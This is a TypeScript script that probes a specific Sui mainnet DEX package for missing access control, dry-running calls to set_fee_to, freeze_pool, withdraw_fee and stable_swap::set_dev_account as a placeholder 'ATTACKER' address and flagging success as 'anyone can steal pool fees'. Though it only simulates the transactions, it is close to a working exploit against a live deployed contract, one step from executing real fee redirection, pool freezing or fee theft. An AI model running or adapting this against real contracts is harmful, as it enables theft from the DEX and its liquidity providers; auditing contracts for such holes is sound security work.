import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const PKG = "0xb24b6789e088b876afabca733bed2299fbc9e2d6369be4d1acfa17d8145454d9";
const DEX_INFO = "0x3f2d9f724f4a1ce5e71676448dc452be9a6243dac9c5b975a588c8c867066e92";
const DEX_INFO_VERSION = 1587827;

const ATTACKER = "0xdeadbeef00000000000000000000000000000000000000000000000000000000";

async function dryRunSetFeeTo() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::swap::set_fee_to`,
    arguments: [
      tx.object(DEX_INFO),
      tx.pure.address(ATTACKER),
    ],
  });

  try {
    const result = await client.devInspectTransactionBlock({
      transactionBlock: tx,
      sender: ATTACKER,
    });
    const status = result.effects.status;
    console.log("=== swap::set_fee_to dry-run ===");
    console.log("Status:", status.status);
    if (status.status === "success") {
      console.log("!!! CRITICAL: set_fee_to SUCCESS - anyone can redirect fees !!!");
    } else {
      console.log("Error:", status.error);
    }
  } catch(e: any) {
    console.log("Exception:", e.message?.slice(0, 200));
  }
}

async function dryRunFreezePool() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::swap::freeze_pool`,
    typeArguments: [
      "0x2::sui::SUI",
      "0xd9f9b0b4f35276eecd1eea6985bfabe2a2bbd5575f9adb9162ccbdb4ddebde7f::smove::SMOVE"
    ],
    arguments: [
      tx.pure.bool(true),
      tx.object(DEX_INFO),
    ],
  });

  try {
    const result = await client.devInspectTransactionBlock({
      transactionBlock: tx,
      sender: ATTACKER,
    });
    const status = result.effects.status;
    console.log("\n=== swap::freeze_pool dry-run ===");
    console.log("Status:", status.status);
    if (status.status === "success") {
      console.log("!!! CRITICAL: freeze_pool SUCCESS - anyone can freeze trading !!!");
    } else {
      console.log("Error:", status.error);
    }
  } catch(e: any) {
    console.log("Exception:", e.message?.slice(0, 200));
  }
}

async function dryRunWithdrawFee() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::swap::withdraw_fee`,
    typeArguments: [
      "0x2::sui::SUI",
      "0xd9f9b0b4f35276eecd1eea6985bfabe2a2bbd5575f9adb9162ccbdb4ddebde7f::smove::SMOVE"
    ],
    arguments: [
      tx.object(DEX_INFO),
    ],
  });

  try {
    const result = await client.devInspectTransactionBlock({
      transactionBlock: tx,
      sender: ATTACKER,
    });
    const status = result.effects.status;
    console.log("\n=== swap::withdraw_fee dry-run ===");
    console.log("Status:", status.status);
    if (status.status === "success") {
      console.log("!!! CRITICAL: withdraw_fee SUCCESS - anyone can steal pool fees !!!");
    } else {
      console.log("Error:", status.error);
    }
  } catch(e: any) {
    console.log("Exception:", e.message?.slice(0, 200));
  }
}

async function dryRunSetStableFee() {
  // First find a Dex_Stable_Info object
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::stable_swap::set_dev_account`,
    arguments: [
      tx.object("0x0000000000000000000000000000000000000000000000000000000000000006"), // placeholder
      tx.pure.address(ATTACKER),
    ],
  });

  try {
    const result = await client.devInspectTransactionBlock({
      transactionBlock: tx,
      sender: ATTACKER,
    });
    const status = result.effects.status;
    console.log("\n=== stable_swap::set_dev_account dry-run (wrong obj - just checking auth) ===");
    console.log("Status:", status.status);
    console.log("Error:", status.error);
  } catch(e: any) {
    console.log("Exception:", e.message?.slice(0, 200));
  }
}

(async () => {
  await dryRunSetFeeTo();
  await dryRunFreezePool();
  await dryRunWithdrawFee();
  await dryRunSetStableFee();
})();
